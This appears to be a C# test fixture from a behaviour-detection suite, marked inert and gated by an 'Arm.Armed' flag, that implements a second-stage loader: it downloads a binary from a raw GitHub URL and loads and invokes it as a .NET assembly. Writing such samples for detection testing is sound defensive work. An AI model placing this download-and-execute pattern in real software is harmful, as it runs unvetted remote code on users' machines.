// Inert fixture: never executed (gated by Arm.Armed). BF09 malicious: downloads bytes from a raw code host and loads them as an assembly.
using System;
using System.Net.Http;
using System.Reflection;

namespace Behaviour
{
    public static class StageTwo
    {
        public static void Run()
        {
            if (!Arm.Armed) return;
            using var client = new HttpClient();
            var bytes = client.GetByteArrayAsync("https://raw.githubusercontent.com/silvergun-behaviour-suite/payload/main/stage2.bin").GetAwaiter().GetResult();
            var assembly = Assembly.Load(bytes);
            assembly.EntryPoint.Invoke(null, new object[] { new string[0] });
        }
    }
}
